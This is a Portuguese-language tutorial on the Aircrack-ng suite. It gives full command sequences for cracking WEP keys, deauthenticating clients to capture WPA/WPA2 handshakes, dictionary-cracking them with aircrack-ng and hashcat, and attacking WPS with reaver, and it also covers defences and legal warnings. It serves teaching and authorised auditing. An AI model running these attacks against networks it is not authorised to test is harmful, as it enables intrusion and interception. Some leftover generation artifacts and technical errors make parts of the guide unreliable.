<!-- =============================================== -->
<!--               Aircrack-ng Suite                -->
<!-- =============================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Tool-Aircrack--ng-critical?style=for-the-badge">
  <img src="https://img.shields.io/badge/Category-Wireless%20Security-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-WiFi%20Auditing-black?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Protocols-WEP%20%7C%20WPA%20%7C%20WPA2%20%7C%20WPS-red?style=flat-square">
  <img src="https://img.shields.io/badge/Platform-Linux-informational?style=flat-square">
  <img src="https://img.shields.io/badge/Execution-Monitor%20Mode-black?style=flat-square">
  <img src="https://img.shields.io/badge/Context-Pentest%20%7C%20Red%20Team-black?style=flat-square">
</p>

---

# 📡 Aircrack-ng
## Auditoria e Testes de Segurança em Redes Wireless

> O **:contentReference[oaicite:0]{index=0}** é uma das suítes de auditoria Wi-Fi mais utilizadas no mundo da segurança ofensiva.
>
> Projetado para avaliar a robustez de redes wireless, ele permite captura de tráfego, análise de protocolos, injeção de pacotes e quebra de chaves de criptografia utilizadas em **WEP, WPA e WPA2**.
>
> Tornou-se referência em ambientes como o **:contentReference[oaicite:1]{index=1}**, sendo amplamente adotado por profissionais de Pentest, Red Team e pesquisadores em segurança wireless.

---

## 🎯 Objetivo do Documento

Este material apresenta:

- Fundamentos de segurança Wi-Fi
- Componentes da suíte Aircrack-ng
- Configuração de modo monitor
- Captura de handshakes WPA/WPA2
- Ataques a WEP e WPS
- Interpretação técnica de saídas
- Medidas defensivas e boas práticas

---

## 📌 Escopo Técnico

- **Categoria:** Wireless Security
- **Tipo de Auditoria:** Redes 802.11
- **Modos Operacionais:** Monitor Mode / Packet Injection
- **Protocolos Avaliados:** WEP · WPA · WPA2 · WPS
- **Ambiente:** Linux (Kali, Parrot, distribuições compatíveis)

---

## 🧠 Conceitos Fundamentais Envolvidos

- Monitor Mode
- Packet Injection
- IV (Initialization Vector)
- 4-Way Handshake
- Criptografia RC4 (WEP)
- PSK Cracking
- Ataques de Deautenticação
- Segurança 802.11

---

## 🏷️ Tags

`#AircrackNg` `#WirelessSecurity`  
`#WiFiPentest` `#WEP` `#WPA2`  
`#PacketInjection` `#RedTeam`  
`#OffensiveSecurity`

---

## ⚠️ Aviso Legal

> Este material é destinado exclusivamente para fins educacionais e auditorias autorizadas.
>
> A interceptação ou quebra de segurança de redes Wi-Fi sem permissão é crime e pode resultar em penalidades legais severas.

---
# Introdução

Aircrack-ng é uma suite completa de ferramentas para avaliar a segurança de redes Wi-Fi. Desenvolvida para testar vulnerabilidades em protocolos wireless, tornou-se padrão na indústria de segurança para auditoria de redes sem fio.

---
# O que é o Aircrack-ng?

## 1. Definição e Propósito

Aircrack-ng é  uma suite de software que inclui:

- Scanner de redes wireless.
- Capturador de pacotes.
- Analisador de protocolos.
- Ferramentas de injeção de pacotes.
- Quebrador de chaves de criptografia.

**Objetivo principal:** Testar a segurança de redes Wi-Fi identificando vulnerabilidades em protocolos de criptografia.

## 2. Histórico e Desenvolvimento

- **Criação:** Desenvolvida originalmente por Christophe Devine.
- **Evolução:** Mantida por uma comunidade de desenvolvedores.
- **Versão inicial:** Lançada em 2006.
- **Linguagem:** Primariamente escrita em C.
- **Licença:** GPLv2 (Open Source).

---
# Componentes da Suite Aircrack-ng

## 1. Principais Ferramentas

```bash
# Lista dos componentes principais
aircrack-ng     # Quebrador de chaves WEP/WPA
airmon-ng       # Configura interfaces em modo monitor
airodump-ng     # Captura pacotes wireless
aireplay-ng     # Injeção de pacotes e ataques
airbase-ng      # Pontos de acesso falsos
airdecap-ng     # Decripta arquivos capture
airolib-ng      # Gerencia e otimiza wordlists
packetforge-ng  # Cria pacotes para injeção
```

## 2. Funcionalidades por Protocolo

- **WEP:** Quebra completa em minutos.
- **WPA/WPA2-PSK:** Ataques baseados em dicionário.
- **WPA3:** Suporte experimental para análises.
- **WPS:** Ataques ao Wi-Fi Protected Setup.

---
# Instalação e Configuração

## 1. Instalação no Kali Linux

```bash
# Instalação padrão
sudo apt update
sudp apt install aircrack-ng

# Verificar instalação
aircrack-ng --help
```

## 2. Configuração da Interface Wireless

```bash
# Listar interfaces disponíveis
iwconfig

# Parar processos que interferem
sudo airmon-ng check kill

# Habilitar modo monitor
sudo airmon-ng start wlan0

# Verificar modo monitor
sudo airmon-ng
```

---
# Modos de Usos e Cenários

## Cenário 1: Reconhecimento de Redes

```bash
# Scanner passivo de redes
sudo airodump-ng wlan0mon

# Scanner com filtro por canal
sudo airodump-ng wlan0mon --channel 6

# Salvar resultados em arquivo
sudo airodump-ng wlan0mon -w scan_results
```

**Saída esperada:**

```text
BSSID              PWR  Beacons  #Data  CH MB  ENC  CIPHER AUTH EESID
AA:BB:CC:DD:EE:FF  -42  100      45     6  54e WPA2 CCMP   PSK  Home-Network
11:22:33:44:55:66  -85  85       12     11 54e WEP  WEP    OPN  Public-WiFi
```

## Cenário 2: Ataque a Rede WEP

```bash
# Passo 1: Capturar IVs específicos
sudo airodump-ng -c 11 --bssid 11:22:33:44:55:66 -w wep_capture wlan0mon

# Passo 2: Injetar tráfego para acelerar captura
sudo aireplay-ng --arpreplay -b 11:22:33:44:55:66 -h AA:BB:CC:DD:EE:FF wlan0mon

# Passo 3: Quebrar chave com IVs capturados
sudo aircrack-ng wep_capture-01.cap
```

**Explicação dos comandos:**

- `--arpreplay`: Reinjecta pacotes ARP para gerar IVs.
- `-b`: Endereço MAC do alvo (BSSID).
- `-h`: Endereço MAC do cliente para spoofing.
- `-w`: Prefixo para arquivos de captura.

## Cenário 3: Ataque a Rede WPA/WPA2

```bash
# Passo 1: Capturar Handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Passo 2: Forçar handshake com deautenticação
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Passo 3: Quebrar handshake com wordlist
sudo aircrack-ng -w rockyou.txt wpa_capture-01.cap
```

## Cenário 4: Ataque WPS

```bash
# Usando wash para detectar WPS
sudo wash -i wlan0mon

# Ataque reaver (parte do suite)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

---
# Análise de Resultados e Saídas

## 1. Interpretação de Saídas do `airodump-ng`

**Campos importantes:**

- `PWR`: Potência do sinal (valores mais próximos de 0 são melhores).
- `Beacons`: Número de pacotes de anúncio recebidos.
- `#Data`: Quantidade de pacotes de dados capturados.
- `CH`: Canal da rede.
- `MB`: Velocidade máxima suportada.
- `ENC`: Tipo de criptografia (WEP, WPA, WPA2).
- `CIPHER`: Cipher suite (CCMP, TKIP, WEP).
- `AUTH`: Tipo de autenticação (PSK, MGT, OPN).
- `ESSID`: Nome da rede wireless.

## 2. Saídas do `aircrack-ng` para WEP

**Chave encontrada com sucesso:**

```txt
KEY FOUND! [ 12:34:56:78:90 ]
Decrypted correctly: 100%
```

**Progresso de ataque:**

```text
Aircrack-ng 1.6 

[00:00:04] Tested 1024 keys (got 1234 IVs)

KB    depth   byte(vote)
 0    0/  1   12(1024)   34(1024)   56(1024)   78(1024)   90(1024)
```

## 3. Saídas do `aircrack-ng` para WPA

**Handshake capturado:**

```text
Read 12345 packets...

#  BSSID              ESSID                     Encryption
1  AA:BB:CC:DD:EE:FF  MyNetwork                 WPA (1 handshake)

Choosing first network as target.
```

**Tentativas de chave:**

```text
Aircrack-ng 1.6 

[00:00:01] 1234/123456 keys tested (1234.56 k/s) 

Time left: 1 minute, 23 seconds (1234.56 k/s)

                           KEY FOUND! [ mysecurepassword123 ]

Master Key     : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF 
                12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF 

Transient Key  : 12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF 
                12 34 56 78 90 AB CD EF 12 34 56 78 90 AB CD EF 
                (etc...)
```

---
# Técnicas de Prevenção Contra Ataques

## 1. Para Redes WEP

**Não use WEP!** - Protocolo completamente vulnerável.

- Migre imediatamente para WPA2 ou WPA3.
- Desative completamente redes WEP.

## 2. Para redes WPA/WPA2

**Boas práticas:**

- Use passphrases complexas (mínimo 12 caracteres)
	- Exemplo de boa passphrase: "Correta@Batata-1234-Cavalo"

- Implemente políticas de troca regular de senhas
- Desative WPS (Wi-Fi Protected Setup)

**Configurações recomendadas:**

- **WPA2-AES** (CCMP) ao invés de WPA-TKIP.
- **Desativar WPS** no roteador.
- **Mudar senha padrão** do administrador.
- **Filtrar MAC address** (camada adicional)

## 3. Para Redes Enterprise

**Medidas avançadas:**

- Implemente WPA3-Enterprise.
- Use certificados 802.1X.
- Configure radius seguro com EAP-TLS.
- Monitore tentativas de autenticação.

## 4. Detecção de Ataques

**Monitoramento proativo:**

- Use Ferramentas como WIDS *(Wireless Intrusion Detection Systems)*
- Configure alertas para:
	- Múltiplas deautenticações.
	- Tentativas de associação anômalas.
	- Pacotes injetados.
	- Atividade em modo monitor detectada.

**Exemplo de Detecção:**

```bash
# Usar airodump-ng para monitorar deautenticações
sudo airodump-ng wlan0mon --output-format pcap -w monitoramento
```

---
# Considerações Legais e Éticas

>[!warning] Legalidade de Uso
>**Só é legal para**:
>- Testes em redes próprias
>- Auditorias com autorização por escrito
>- Pesquisa educacional em ambientes controlados
> 
>**É ilegal para**:
>- Acessar redes sem autorização
>- Interceptar comunicações alheias
>- Qualquer atividade maliciosa

>[!info] Boas Práticas Éticas
>- Sempre obtenha permissão por escrito
>- Documente todos os testes realizados
>- Relate vulnerabilidades de forma responsável
>- Não cause interrupção de serviços
>- Proteja dados capturados durante testes

---
# Otimização e Dicas Avançadas

## 1. Melhorando Performance

```bash
# Usar GPU para quebra de chaves (hashcat)
aircrack-ng -w wordlist.txt capture.cap | tee results.txt

# Combinar com hashcat para maior velocidade
aircrack-ng -J output capture.cap
hashcat -m 22000 output.hc22000 wordlist.txt

# Usar wordlists otimizadas
crunch 8 12 -t @@@%%%%%% -o custom_wordlist.txt
```

## 2. Solução de Problemas Comuns

**Problema:** Interface não entra em modo monitor

```bash
# Solução: Verificar drivers e processo
sudo airmon-ng check kill
sudo modprobe -r nome_driver
sudo modprobe nome_driver
```

**Problema:** Poucos IVs capturados em WEP

```bash
# Solução: Aumentar injeção de pacotes
aireplay-ng --fakeauth 30 -a AA:BB:CC:DD:EE:FF -h 11:33:44:55:66 wlan0mon
```

---
# Estatísticas e Casos de Estudo

## 1. Eficácia por Tipo de Ataque

**WEP**:

- Sucesso: 100% com IVs suficiente    
- Tempo médio: 5-30 minutos
- IVs necessários: 5,000-50,000

**WPA/WPA2**:

- Sucesso: Depende da wordlist    
- Tempo médio: Variável (horas a dias)
- Eficácia: 60-80% com wordlists boas

## 2. Casos Reais de Vulnerabilidades

**Estudo de caso 1**: Rede corporativa com WEP

- Vulnerabilidade: Protocolo WEP implementado
- Exploração: Capturados 15,000 IVs em 8 minutos
- Consequência: Chave quebrada em 12 minutos
- Solução: Migração para WPA2-Enterprise

**Estudo de caso 2**: Rede WPA com senha fraca

- Vulnerabilidade: Senha baseada em dicionário
- Exploração: Handshake capturado em 2 minutos
- Consequência: Senha descoberta em 15 minutos
- Solução: Implementação de senha complexa

---
# Recursos e Referências

## 1. Documentação Oficial

- [Site oficial](https://www.aircrack-ng.org/) 
- [Documentação](https://www.aircrack-ng.org/doku.php)
- [Fórum da comunidade](https://forum.aircrack-ng.org/)

## 2. Tutoriais e Guias

- [Guia oficial](https://www.aircrack-ng.org/doku.php?id=getting_started)
- [Wiki do BackTrack/Kali](https://www.kali.org/tools/aircrack-ng/)
- [Tutoriais em vídeo](https://www.youtube.com/results?search_query=aircrack-ng+tutorial)

## 3. Ferramentas Complementares

- **Hashcat**: Aceleração por GPU
- **Crunch**: Geração de wordlists
- **Wifite**: Automação de ataques
- **Kismet**: Detecção wireless
